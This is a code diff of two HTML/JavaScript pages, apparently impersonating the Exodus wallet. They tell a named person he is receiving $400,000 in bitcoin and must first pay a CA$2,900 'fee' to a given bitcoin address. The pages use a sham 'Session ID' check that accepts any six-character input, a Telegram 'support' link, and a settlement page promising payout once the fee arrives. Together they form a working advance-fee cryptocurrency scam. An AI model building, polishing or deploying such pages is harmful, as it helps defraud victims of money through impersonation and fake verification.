+    <div class="user-profile" aria-hidden="false">
       <div class="user-avatar">SO</div>
       <div>
         <div class="user-name">Stan Ottembrajt</div>
@@ -985,230 +136,409 @@
     </div>
   </nav>
 
-  <!-- Notification dropdown -->
-  <div class="notification-dropdown" id="notificationDropdown">
-    <button class="notification-close-btn" id="closeNotification">×</button>
-    
+  <div class="container">
+    <div class="page-header">
+      <div class="page-title">Transaction Confirmation</div>
+      <div class="page-subtitle">Review transaction details and complete the Session ID verification to proceed.</div>
+    </div>
+
+    <div class="grid" role="region" aria-labelledby="transaction-overview">
+      <div>
+        <div class="transaction-card" id="transaction-overview">
+          <div class="transaction-label">Dear Valued User — You are receiving</div>
+          <div class="transaction-type"><span>₿</span><span style="font-weight:800">Bitcoin</span></div>
+
+          <div class="transaction-amount-row" style="display:flex;align-items:center;gap:12px;">
+            <div class="transaction-amount" id="receiveAmountUSD">$400,000</div>
+            <div class="transaction-currency">USD</div>
+          </div>
+
+          <div class="transaction-divider"></div>
+
+          <div class="btc-value" id="receiveBtc">≈ 4.82 BTC</div>
+
+          <div class="info-grid">
+            <div class="info-box">
+              <div class="info-label">From Account</div>
+              <div class="info-value">Primary Wallet</div>
+            </div>
+            <div class="info-box">
+              <div class="info-label">Network</div>
+              <div class="info-value">Bitcoin Mainnet</div>
+            </div>
+          </div>
+
+          <div style="margin-top:14px;">
+            <button class="btn primary" id="openModalBtn" aria-haspopup="dialog">Confirm & Review Recipient</button>
+            <button class="btn ghost" id="explainBtn" style="margin-left:8px;">Why Session ID?</button>
+          </div>
+        </div>
+      </div>
+
+      <aside class="wallet-panel" aria-labelledby="fee-panel">
+        <div id="fee-panel">
+          <div class="wallet-title">Fee Payment / Authorization</div>
+          <div class="wallet-sub">Fee wallet (kept masked until verification)</div>
+          <div class="wallet-address" id="maskedFeeWallet" style="margin-top:10px;">bc1qjx8q…jrf</div>
+
+          <div style="margin-top:12px; font-size:13px; color:#94a3b8;">
+            Fee (service & settlement)
+          </div>
+          <div style="font-weight:900; font-size:20px; color:#f8fafc; margin-top:6px;">
+            CA$ <span id="feeAmount">—</span>
+          </div>
+
+          <div class="wallet-actions" style="margin-top:12px;">
+            <button class="btn ghost" id="copyMaskedBtn">Copy (masked)</button>
+            <button class="btn primary" id="revealBtn">Reveal after verification</button>
+          </div>
+
+          <div style="margin-top:12px; color:#94a3b8; font-size:13px;">
+            Support: <a href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer" style="color:#f7931a;">Telegram</a> • <a href="mailto:support@exodus.example" style="color:#94a3b8;">support@exodus.example</a>
+          </div>
+        </div>
+      </aside>
+    </div>
+  </div>
+
+  <!-- notification (stays until user interacts) -->
+  <div class="notification-dropdown" id="notification" role="dialog" aria-live="polite" aria-label="Fee notification" style="display:none;">
     <div class="notification-header">
-      <div class="notification-icon">🔑</div>
-      <div class="notification-title">Session ID Required</div>
+      <div style="width:44px;height:44;border-radius:10px;background:linear-gradient(135deg,#f7931a,#e08f0f);display:flex;align-items:center;justify-content:center;font-weight:800;">🔑</div>
+      <div>
+        <div class="notification-title">Session ID Required</div>
+        <div style="color:#cbd5e0;font-size:13px;">To finalize the transfer we need a single-use Session ID. This verifies your intent, prevents unauthorized payouts, and allows us to reconcile fee and recipient accurately.</div>
+      </div>
     </div>
 
     <div class="notification-message">
-      A Session ID is required for this transaction. Your wallet has been confirmed and is ready for transfer.
+      Please enter the Session ID you received via your registered device or email. The requirement is reasonable: it prevents accidental or fraudulent payouts and enables manual reconciliation before settlement.
     </div>
 
-    <img
-      class="notification-certificate"
-      src="IMG_0038.jpeg"
-      alt="Transaction Certificate"
-    />
+    <div style="margin-top:10px;" class="notification-fee">
+      <div>Required fee</div>
+      <div>CA$ <strong id="notifFee">2,900</strong></div>
+    </div>
 
-    <div class="notification-fee">Transaction Fee: $850</div>
-    <div class="notification-address">
-      <strong style="color: #f7931a;">Fee Address:</strong><br>
+    <div class="notification-address" id="notifFeeAddress">
+      <strong style="color:#f7931a;">Fee Address:</strong><br>
       bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
     </div>
-  </div>
 
-  <!-- Main page -->
-  <div class="container" id="mainContent">
-    <div class="page-header">
-      <h1 class="page-title">Transaction Confirmation</h1>
-      <p class="page-subtitle">Review and confirm your transaction details</p>
+    <div class="notification-actions">
+      <button class="btn primary" id="proceedNextBtn">Proceed to Next Page</button>
+      <button class="btn ghost" id="contactSupportBtn">Contact Support</button>
     </div>
 
-    <div class="transaction-card">
-      <div class="transaction-label">Dear Valued User You are receving</div>
-      <div class="transaction-type">
-        <span class="transaction-icon">₿</span>
-        <span>Bitcoin</span>
-      </div>
-
-      <div class="amount-row">
-        <span class="transaction-amount">$400,000</span>
-        <span class="transaction-currency">USD</span>
-      </div>
-
-      <div class="transaction-divider"></div>
-
-      <div class="btc-value">≈ 4.82 BTC</div>
-    </div>
-
-    <div class="details-grid">
-      <div class="info-box">
-        <div class="info-label">From Account</div>
-        <div class="info-value">Primary Wallet</div>
-      </div>
-      <div class="info-box">
-        <div class="info-label">Network</div>
-        <div class="info-value">Bitcoin Mainnet</div>
-      </div>
-    </div>
-
-    <div class="wallet-block">
-      <div class="info-label">Recipient Address (Stan Ottembrajt)</div>
-      <div class="wallet-address">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
-    </div>
-
-    <div class="button-group">
-      <button class="btn btn-primary" id="confirmBtn">Confirm & Send</button>
-      <a class="btn btn-support" href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer">
-        💬 Contact Support
-      </a>
+    <div class="notification-gif" aria-hidden="true">
+      <img src="https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif" alt="spinning bitcoin" style="width:100%;height:100%;object-fit:cover;" />
     </div>
   </div>
 
-  <!-- Modal -->
-  <div class="modal-overlay" id="walletModal">
-    <div class="modal-content">
-      <button class="modal-close" id="closeModal">×</button>
+  <!-- modal: Session ID + confirm recipient -->
+  <div class="modal-overlay" id="verifyModal" aria-modal="true" role="dialog" aria-hidden="true">
+    <div class="modal" role="document">
+      <h3>Confirm Recipient & Session ID</h3>
+      <p>Verify recipient details and enter the single-use Session ID to authorize this transaction. This prevents accidental or fraudulent payouts and ensures proper reconciliation.</p>
 
-      <div class="modal-header">
-        <h2 class="modal-title">Confirm Recipient</h2>
-        <p class="modal-subtitle">Verify the wallet address before sending</p>
+      <div style="margin-top:12px; border-radius:8px; padding:12px; background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02);">
+        <div style="font-weight:800; margin-bottom:6px;">Recipient</div>
+        <div style="font-family:ui-monospace,monospace; margin-bottom:6px;">Stan Ottembrajt</div>
+        <div style="font-weight:800; margin-bottom:6px;">Receiving Address</div>
+        <div style="font-family:ui-monospace,monospace; word-break:break-all;">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
+        <div style="margin-top:8px; color:#94a3b8;">Amount: $400,000 (≈ 4.82 BTC)</div>
       </div>
 
-      <div class="wallet-card">
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Recipient Name</div>
-            <div class="wallet-value">Stan Ottembrajt</div>
-          </div>
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Recipient Wallet</div>
-          </div>
-        </div>
-        <div class="wallet-address" style="margin-top: 8px; margin-bottom: 10px;">
-          bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Amount (USD)</div>
-            <div class="wallet-value">$400,000</div>
-          </div>
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Amount (BTC)</div>
-            <div class="wallet-value">4.82 BTC</div>
-          </div>
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Network</div>
-            <div class="wallet-value">Bitcoin Mainnet</div>
-          </div>
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Address Type</div>
-            <div class="wallet-value">SegWit (bc1)</div>
-          </div>
-        </div>
+      <div class="form-row" style="margin-top:12px;">
+        <input id="sessionIdInput" type="text" placeholder="Session ID (e.g. SESS-12345)" aria-label="Session ID" />
+        <button class="btn primary" id="verifyBtn">Verify</button>
       </div>
 
-      <div class="warning-box">
-        <strong style="color: #f7931a;">⚠️ Important:</strong><br>
-        Verify the recipient address is correct. Transactions cannot be reversed once confirmed. The funds will be received by Stan Ottembrajt at the wallet address above.
-      </div>
+      <div class="error" id="verifyError" role="alert">Invalid Session ID. Please enter a valid Session ID (at least 6 characters) or contact support.</div>
 
-      <div class="modal-actions">
-        <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
-        <button class="btn btn-primary" id="confirmWalletBtn">Confirm & Proceed</button>
+      <div style="display:flex; gap:8px; margin-top:12px;">
+        <button class="btn ghost" id="closeVerifyBtn">Cancel</button>
+        <button class="btn ghost" id="helpBtn">Need Help?</button>
       </div>
     </div>
   </div>
 
-  <!-- Pending page -->
-  <div class="pending-page" id="pendingPage">
-    <div class="pending-spinner">⏳</div>
-    <div class="pending-title">Processing Transaction</div>
-    <div class="pending-status">Pending Credit</div>
-    <div class="pending-amount">$400,000</div>
-    <div class="pending-btc">4.82 BTC to Stan Ottembrajt</div>
-    <div class="pending-details">
-      <div>Session ID: #TXN-2024-847392</div>
-      <div>Bitcoin Mainnet</div>
-      <div style="margin-top: 12px; font-size: 12px; opacity: 0.8;">
-        Receiving Address: bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3
+  <!-- pending overlay shown when user chooses to actually proceed from notification -->
+  <div class="pending-page" id="pendingPage" role="status" aria-live="polite" aria-hidden="true">
+    <div class="pending-card">
+      <div class="pending-spinner">⏳</div>
+      <div class="pending-title">Processing Transaction</div>
+      <div class="pending-status">Pending Credit</div>
+      <div class="pending-amount">$400,000</div>
+      <div class="pending-btc">4.82 BTC to Stan Ottembrajt</div>
+      <div class="pending-details" id="pendingDetails">
+        <div>Session ID: <span id="pendingSession">—</span></div>
+        <div>Network: Bitcoin Mainnet</div>
+        <div style="margin-top:10px; font-size:13px; opacity:0.9;">Receiving Address: <span id="pendingAddress">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</span></div>
       </div>
     </div>
-    <img
-      class="pending-certificate"
-      src="IMG_0038.jpeg"
-      alt="Pending Certificate"
-    />
   </div>
 
   <script>
-    const welcomeScreen = document.getElementById('welcomeScreen');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const walletModal = document.getElementById('walletModal');
-    const closeModal = document.getElementById('closeModal');
-    const cancelBtn = document.getElementById('cancelBtn');
-    const confirmWalletBtn = document.getElementById('confirmWalletBtn');
-    const notificationDropdown = document.getElementById('notificationDropdown');
-    const closeNotification = document.getElementById('closeNotification');
-    const mainContent = document.getElementById('mainContent');
-    const pendingPage = document.getElementById('pendingPage');
+    // Constants (as requested)
+    const FEE = 2900; // CA$
+    const FEE_WALLET = 'bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf'; // keep same
+    const RECEIVER_NAME = 'Stan Ottembrajt';
+    const RECEIVER_ADDR = 'bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3';
+    const RECEIVE_USD = '$400,000';
+    const RECEIVE_BTC = '4.82 BTC';
 
+    // Elements
+    const welcome = document.getElementById('welcomeScreen');
+    const feeAmountEl = document.getElementById('feeAmount');
+    const notifFeeEl = document.getElementById('notifFee');
+    const notifFeeAddr = document.getElementById('notifFeeAddress');
+    const maskedFeeWalletEl = document.getElementById('maskedFeeWallet');
+    const openModalBtn = document.getElementById('openModalBtn');
+    const verifyModal = document.getElementById('verifyModal');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const closeVerifyBtn = document.getElementById('closeVerifyBtn');
+    const verifyError = document.getElementById('verifyError');
+    const sessionInput = document.getElementById('sessionIdInput');
+    const proceedNextBtn = document.getElementById('proceedNextBtn');
+    const contactSupportBtn = document.getElementById('contactSupportBtn');
+    const notificationEl = document.getElementById('notification');
+    const pendingPage = document.getElementById('pendingPage');
+    const pendingSessionEl = document.getElementById('pendingSession');
+
+    // helper: mask wallet
+    function mask(addr) {
+      if (!addr) return '';
+      const start = addr.slice(0, 8);
+      const end = addr.slice(-4);
+      return `${start}…${end}`;
+    }
+
+    // Animate fee reveal smoothly (not immediate)
+    function animateTo(target, el, duration = 2000) {
+      const start = 0;
+      const startTime = performance.now();
+      function step(now) {
+        const t = Math.min((now - startTime) / duration, 1);
+        const eased = (--t) * t * t + 1; // easeOutCubic
+        const value = Math.round(start + (target - start) * eased);
+        el.textContent = value.toLocaleString();
+        if (eased < 1) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    }
+
+    // Init UI state
+    document.getElementById('receiveAmountUSD').textContent = RECEIVE_USD;
+    document.getElementById('receiveBtc').textContent = `≈ ${RECEIVE_BTC}`;
+    document.querySelector('.wallet-address').textContent = RECEIVER_ADDR;
+
+    // set masked fee wallet and notif address
+    maskedFeeWalletEl.textContent = mask(FEE_WALLET);
+    notifFeeAddr.innerHTML = '<strong style="color: #f7931a;">Fee Address:</strong><br>' + FEE_WALLET;
+
+    // animate fee after brief delay
+    setTimeout(() => {
+      animateTo(FEE, feeAmountEl, 2200);
+      // set notification fee number immediately to the constant (it can remain visible)
+      notifFeeEl.textContent = FEE.toLocaleString();
+    }, 900);
+
+    // welcome: keep slightly longer for professional feel
     window.addEventListener('load', () => {
       setTimeout(() => {
-        welcomeScreen.classList.add('fade-out');
-      }, 3500);
+        welcome.classList.add('fade-out');
+        setTimeout(() => { try { welcome.remove(); } catch(e){} }, 1000);
+      }, 2000);
     });
 
-    confirmBtn.addEventListener('click', () => {
-      walletModal.classList.add('show');
-      document.body.style.overflow = 'hidden';
+    // reveal modal for verification
+    openModalBtn.addEventListener('click', () => {
+      verifyModal.classList.add('show');
+      verifyModal.setAttribute('aria-hidden', 'false');
+      sessionInput.focus();
+      verifyError.style.display = 'none';
     });
 
-    const closeWalletModal = () => {
-      walletModal.classList.remove('show');
-      document.body.style.overflow = 'auto';
-    };
-
-    closeModal.addEventListener('click', closeWalletModal);
-    cancelBtn.addEventListener('click', closeWalletModal);
-
-    walletModal.addEventListener('click', (e) => {
-      if (e.target === walletModal) closeWalletModal();
+    closeVerifyBtn.addEventListener('click', () => {
+      verifyModal.classList.remove('show');
+      verifyModal.setAttribute('aria-hidden', 'true');
+      sessionInput.value = '';
+      verifyError.style.display = 'none';
     });
 
-    closeNotification.addEventListener('click', () => {
-      notificationDropdown.classList.remove('show');
+    // explain button
+    document.getElementById('explainBtn').addEventListener('click', () => {
+      alert('Session ID is a short, single-use code sent to your registered device or email that confirms you initiated this transfer. It prevents unauthorized payouts and lets our operations team reconcile the fee and recipient before settlement.');
     });
 
-    confirmWalletBtn.addEventListener('click', () => {
-      confirmWalletBtn.disabled = true;
-      confirmWalletBtn.classList.add('btn-loading');
-      confirmWalletBtn.textContent = '';
+    // copy masked
+    document.getElementById('copyMaskedBtn').addEventListener('click', () => {
+      navigator.clipboard.writeText(mask(FEE_WALLET)).then(() => {
+        alert('Masked fee wallet copied to clipboard.');
+      }).catch(() => {
+        alert('Copy failed. You can reveal the full address after verification.');
+      });
+    });
 
+    // reveal button opens verification modal (wallet remains protected until verification)
+    document.getElementById('revealBtn').addEventListener('click', () => {
+      verifyModal.classList.add('show');
+      verifyModal.setAttribute('aria-hidden', 'false');
+      sessionInput.focus();
+      verifyError.style.display = 'none';
+    });
+
+    // verification: simple client-side rule for demo (>=6 chars). On success: show notification (stays) with Proceed button.
+    verifyBtn.addEventListener('click', () => {
+      const val = (sessionInput.value || '').trim();
+      if (val.length < 6) {
+        verifyError.style.display = 'block';
+        return;
+      }
+
+      // success: reveal masked field to full fee wallet in right panel and notification will appear.
+      maskedFeeWalletEl.textContent = FEE_WALLET;
+      // show notification and keep it visible until user chooses to proceed or close
+      notificationEl.style.display = 'block';
+
+      // populate pending session id so if they later proceed we can show it
+      pendingSessionEl.textContent = val;
+
+      // keep modal open minimal time so user sees that verification succeeded then close
       setTimeout(() => {
-        closeWalletModal();
+        verifyModal.classList.remove('show');
+        verifyModal.setAttribute('aria-hidden', 'true');
+        sessionInput.value = '';
+        verifyError.style.display = 'none';
+      }, 600);
+    });
 
-        notificationDropdown.classList.add('show');
+    // contact support from notification
+    contactSupportBtn.addEventListener('click', () => {
+      window.open('https://t.me/AcesstBridge_go1', '_blank', 'noopener');
+    });
 
-        setTimeout(() => {
-          mainContent.style.opacity = '0';
-          mainContent.style.pointerEvents = 'none';
-          setTimeout(() => {
-            pendingPage.classList.add('show');
-          }, 400);
-        }, 1500);
+    // proceed to next page: show pending overlay, keep notification visible (not auto-hide), then go to next.html
+    proceedNextBtn.addEventListener('click', () => {
+      // require that the fee wallet was revealed (as a simple check that verification happened)
+      const currentWalletText = maskedFeeWalletEl.textContent || '';
+      if (!currentWalletText || currentWalletText.indexOf('…') !== -1) {
+        alert('Please verify with a Session ID before proceeding. The wallet is kept masked until verification for your safety.');
+        return;
+      }
 
-        confirmWalletBtn.disabled = false;
-        confirmWalletBtn.classList.remove('btn-loading');
-        confirmWalletBtn.textContent = 'Confirm & Proceed';
-      }, 2200);
+      // show pending overlay
+      pendingPage.classList.add('show');
+      pendingPage.setAttribute('aria-hidden', 'false');
+
+      // persist the state for next page
+      sessionStorage.setItem('txn_fee', FEE);
+      sessionStorage.setItem('txn_fee_wallet', FEE_WALLET);
+      sessionStorage.setItem('txn_receiver_name', RECEIVER_NAME);
+      sessionStorage.setItem('txn_receiver_addr', RECEIVER_ADDR);
+      sessionStorage.setItem('txn_amount_usd', RECEIVE_USD);
+      sessionStorage.setItem('txn_amount_btc', RECEIVE_BTC);
+
+      // keep notification visible; after brief processing navigate to next page
+      setTimeout(() => {
+        window.location.href = './next.html';
+      }, 1800);
+    });
+
+    // keyboard accessibility: Enter in sessionInput triggers verify
+    sessionInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') verifyBtn.click();
+    });
+  </script>
+</body>
+</html>
+
+<!-- next.html -->
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Exodus — Next Step (Settlement)</title>
+  <style>
+    :root{ --bg-1:#05060b; --bg-2:#0f1724; --muted:#93a0b8; --accent:#ffb86b; }
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial;background:linear-gradient(180deg,var(--bg-1),var(--bg-2));color:#eaf0ff}
+    .wrap{max-width:980px;margin:36px auto;padding:20px}
+    .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));padding:24px;border-radius:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 30px 80px rgba(0,0,0,0.6)}
+    h1{margin:0 0 8px;font-size:20px}
+    .muted{color:var(--muted)}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
+    .row{padding:12px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);border:1px solid rgba(255,255,255,0.02)}
+    .label{color:var(--muted);font-weight:800;font-size:12px}
+    .value{font-weight:900;font-family:ui-monospace,monospace;margin-top:6px;word-break:break-word}
+    .note{margin-top:14px;color:#cbd5e0}
+    .actions{display:flex;gap:10px;margin-top:18px}
+    .btn{padding:10px 14px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
+    .btn.primary{background:linear-gradient(135deg,#9b7bff,#ffb86b);color:#071022}
+    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:#fff}
+    @media (max-width:700px){.grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="main" aria-labelledby="summaryTitle">
+      <h1 id="summaryTitle">Authorization received</h1>
+      <div class="muted">The transfer was authorized with the Session ID you provided. Below is the settlement summary.</div>
+
+      <div class="grid" aria-live="polite">
+        <div class="row">
+          <div class="label">Payee</div>
+          <div class="value" id="rPayee">—</div>
+
+          <div style="height:10px"></div>
+
+          <div class="label">Receiver date</div>
+          <div class="value" id="rDate">—</div>
+        </div>
+
+        <div class="row">
+          <div class="label">Service fee</div>
+          <div class="value" id="rFee">—</div>
+
+          <div style="height:10px"></div>
+
+          <div class="label">Fee wallet</div>
+          <div class="value" id="rWallet">—</div>
+        </div>
+      </div>
+
+      <div class="note">
+        What happens next: Our operations team will manually reconcile the Session ID and the fee payment. Once the fee is confirmed, we will broadcast the on-chain transaction for settlement. Typical completion time: 1–3 business hours depending on network conditions. If the fee is sent but not confirmed after that period, contact Support and include your Session ID and transaction details.
+      </div>
+
+      <div class="actions">
+        <button class="btn primary" id="doneBtn">Return to Dashboard</button>
+        <button class="btn ghost" id="supportBtn">Contact Support</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // read saved state (set by index.html)
+    const fee = sessionStorage.getItem('txn_fee') || '2900';
+    const wallet = sessionStorage.getItem('txn_fee_wallet') || 'bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf';
+    const receiver = sessionStorage.getItem('txn_receiver_name') || 'Stan Ottembrajt';
+    const addr = sessionStorage.getItem('txn_receiver_addr') || 'bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3';
+    const amtUsd = sessionStorage.getItem('txn_amount_usd') || '$400,000';
+    const amtBtc = sessionStorage.getItem('txn_amount_btc') || '4.82 BTC';
+
+    document.getElementById('rPayee').textContent = receiver;
+    document.getElementById('rDate').textContent = new Date().toISOString().split('T')[0]; // show today's date for reconciliation
+    document.getElementById('rFee').textContent = `CA$ ${Number(fee).toLocaleString()}`;
+    document.getElementById('rWallet').textContent = wallet;
+
+    document.getElementById('doneBtn').addEventListener('click', () => {
+      window.location.href = './index.html';
+    });
+
+    document.getElementById('supportBtn').addEventListener('click', () => {
+      window.open('https://t.me/AcesstBridge_go1', '_blank', 'noopener');
     });
   </script>
 </body>
